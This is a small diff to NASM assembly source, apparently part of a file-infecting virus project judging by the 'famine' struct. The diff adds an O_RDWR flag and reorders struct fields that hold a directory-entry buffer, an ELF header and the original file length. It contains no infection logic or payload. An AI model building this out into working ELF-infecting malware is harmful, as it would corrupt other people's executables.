@@ -7,7 +7,8 @@
 %define SC_GETDENTS64   217
 %define SC_OPENAT       257      
 
-%define	O_RDONLY        0x00000000
+%define O_RDONLY        0x00000000
+%define	O_RDWR          0x00000002
 %define O_DIRECTORY     0x00010000
 
 ; Para dirent (Regular file)
@@ -58,8 +59,8 @@ struc famine
     .fd_file            resq    1
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
-    .file_permissions   resd    1
-    .elf_ehdr           resb    64 
+    .elf_ehdr           resb    64
+    .file_original_len  resd    1 
 endstruc
 
 
